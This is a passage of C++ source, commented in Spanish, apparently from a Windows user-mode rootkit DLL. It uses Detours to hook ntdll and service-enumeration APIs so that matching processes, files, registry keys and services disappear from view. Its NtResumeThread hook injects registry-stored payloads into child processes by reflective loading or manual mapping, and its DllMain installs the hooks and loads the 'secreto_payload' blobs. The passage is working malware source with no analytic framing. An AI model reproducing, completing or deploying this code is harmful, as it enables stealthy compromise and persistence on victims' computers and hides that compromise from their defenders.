                    InjectReflective_x86(hProc, PayloadCacheados_x86);
                }
#else
                if (isWow64 && !PayloadCacheados.empty()) {
                    ManualMap(hProc, PayloadCacheados);
                }
#endif
                CloseHandle(hProc);
            }
            PIDsHijosInyectados.insert(processId);
        }
    }

    return OriginalNtResumeThread(thread, suspendCount);
}

BOOL WINAPI HookedEnumServicesStatusExW(SC_HANDLE serviceManager, SC_ENUM_TYPE infoLevel, DWORD serviceType, DWORD serviceState, LPBYTE services, DWORD servicesLength, LPDWORD bytesNeeded, LPDWORD servicesReturned, LPDWORD resumeHandle, LPCWSTR groupName) {
    BOOL result = OriginalEnumServicesStatusExW(serviceManager, infoLevel, serviceType, serviceState, services, servicesLength, bytesNeeded, servicesReturned, resumeHandle, groupName);
    if (result && services && servicesReturned) {
        LPENUM_SERVICE_STATUS_PROCESSW pServices = (LPENUM_SERVICE_STATUS_PROCESSW)services;
        for (DWORD i = 0; i < *servicesReturned; i++) {
            if (pServices[i].lpServiceName && IsHidden(pServices[i].lpServiceName, wcslen(pServices[i].lpServiceName) * sizeof(WCHAR))) {
                memmove(&pServices[i], &pServices[i + 1], (*servicesReturned - i - 1) * sizeof(ENUM_SERVICE_STATUS_PROCESSW));
                memset(&pServices[*servicesReturned - 1], 0, sizeof(ENUM_SERVICE_STATUS_PROCESSW));
                (*servicesReturned)--;
                i--;
            }
        }
    }
    return result;
}

BOOL WINAPI HookedEnumServicesStatusExW2(SC_HANDLE serviceManager, SC_ENUM_TYPE infoLevel, DWORD serviceType, DWORD serviceState, LPBYTE services, DWORD servicesLength, LPDWORD bytesNeeded, LPDWORD servicesReturned, LPDWORD resumeHandle, LPCWSTR groupName) {
    BOOL result = OriginalEnumServicesStatusExW2(serviceManager, infoLevel, serviceType, serviceState, services, servicesLength, bytesNeeded, servicesReturned, resumeHandle, groupName);
    if (result && services && servicesReturned) {
        LPENUM_SERVICE_STATUS_PROCESSW pServices = (LPENUM_SERVICE_STATUS_PROCESSW)services;
        for (DWORD i = 0; i < *servicesReturned; i++) {
            if (pServices[i].lpServiceName && IsHidden(pServices[i].lpServiceName, wcslen(pServices[i].lpServiceName) * sizeof(WCHAR))) {
                memmove(&pServices[i], &pServices[i + 1], (*servicesReturned - i - 1) * sizeof(ENUM_SERVICE_STATUS_PROCESSW));
                memset(&pServices[*servicesReturned - 1], 0, sizeof(ENUM_SERVICE_STATUS_PROCESSW));
                (*servicesReturned)--;
                i--;
            }
        }
    }
    return result;
}

// MOTOR DETOURS Y PUNTO DE ENTRADA

void InitializeHooks() {
    TlsKeyNode_Key = TlsAlloc();
    TlsKeyNode_Index = TlsAlloc();
    TlsKeyNode_I = TlsAlloc();
    TlsKeyNode_CorrectedIndex = TlsAlloc();

    TlsKeyValue_Key = TlsAlloc();
    TlsKeyValue_Index = TlsAlloc();
    TlsKeyValue_I = TlsAlloc();
    TlsKeyValue_CorrectedIndex = TlsAlloc();

    DetourTransactionBegin();
    DetourUpdateThread(GetCurrentThread());
    HMODULE hNt = GetModuleHandleA("ntdll.dll");

    OriginalNtQuerySystem = (pNtQuerySystemInformation)GetProcAddress(hNt, "NtQuerySystemInformation");
    if (OriginalNtQuerySystem) DetourAttach(&(PVOID&)OriginalNtQuerySystem, HookedNtQuerySystemInformation);

    OriginalNtQueryDirectoryFile = (pNtQueryDirectoryFile)GetProcAddress(hNt, "NtQueryDirectoryFile");
    if (OriginalNtQueryDirectoryFile) DetourAttach(&(PVOID&)OriginalNtQueryDirectoryFile, HookedNtQueryDirectoryFile);

    OriginalNtQueryDirectoryFileEx = (pNtQueryDirectoryFileEx)GetProcAddress(hNt, "NtQueryDirectoryFileEx");
    if (OriginalNtQueryDirectoryFileEx) DetourAttach(&(PVOID&)OriginalNtQueryDirectoryFileEx, HookedNtQueryDirectoryFileEx);

    OriginalNtEnumerateKey = (pNtEnumerateKey)GetProcAddress(hNt, "NtEnumerateKey");
    if (OriginalNtEnumerateKey) DetourAttach(&(PVOID&)OriginalNtEnumerateKey, HookedNtEnumerateKey);

    OriginalNtEnumerateValueKey = (pNtEnumerateValueKey)GetProcAddress(hNt, "NtEnumerateValueKey");
    if (OriginalNtEnumerateValueKey) DetourAttach(&(PVOID&)OriginalNtEnumerateValueKey, HookedNtEnumerateValueKey);

    OriginalNtQueryKey = (pNtQueryKey)GetProcAddress(hNt, "NtQueryKey");
    if (OriginalNtQueryKey) DetourAttach(&(PVOID&)OriginalNtQueryKey, HookedNtQueryKey);

    OriginalNtDeviceIoControlFile = (pNtDeviceIoControlFile)GetProcAddress(hNt, "NtDeviceIoControlFile");
    if (OriginalNtDeviceIoControlFile) DetourAttach(&(PVOID&)OriginalNtDeviceIoControlFile, HookedNtDeviceIoControlFile);

    OriginalNtResumeThread = (pNtResumeThread)GetProcAddress(hNt, "NtResumeThread");
    if (OriginalNtResumeThread) DetourAttach(&(PVOID&)OriginalNtResumeThread, HookedNtResumeThread);

    HMODULE hAdvapi = GetModuleHandleA("advapi32.dll");
    if (hAdvapi) {
        OriginalEnumServicesStatusExW = (pEnumServicesStatusExW)GetProcAddress(hAdvapi, "EnumServicesStatusExW");
        if (OriginalEnumServicesStatusExW) DetourAttach(&(PVOID&)OriginalEnumServicesStatusExW, HookedEnumServicesStatusExW);
    }

    HMODULE hSechost = GetModuleHandleA("sechost.dll");
    if (hSechost) {
        OriginalEnumServicesStatusExW2 = (pEnumServicesStatusExW)GetProcAddress(hSechost, "EnumServicesStatusExW");
        if (OriginalEnumServicesStatusExW2) DetourAttach(&(PVOID&)OriginalEnumServicesStatusExW2, HookedEnumServicesStatusExW2);
    }

    DetourTransactionCommit();
}

static bool g_bInyectado = false;

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lp) {
    if (reason == DLL_PROCESS_ATTACH) {
        if (g_bInyectado) return TRUE;
        g_bInyectado = true;

        DisableThreadLibraryCalls(hModule);
        DWORD oldProtect;
        if (VirtualProtect(hModule, 0x1000, PAGE_READWRITE, &oldProtect)) {
            *(WORD*)((BYTE*)hModule + HEADER_OFFSET) = MY_SIGNATURE;
            VirtualProtect(hModule, 0x1000, oldProtect, &oldProtect);
        }
        InitializeHooks();

#ifdef _WIN64
        PayloadCacheados     = CargarPayloadDeRegistro(L"secreto_payload");
        PayloadCacheados_x86 = CargarPayloadDeRegistro(L"secreto_payload_x86");
#else
        PayloadCacheados     = CargarPayloadDeRegistro(L"secreto_payload_x86");
#endif
    }
    return TRUE;
}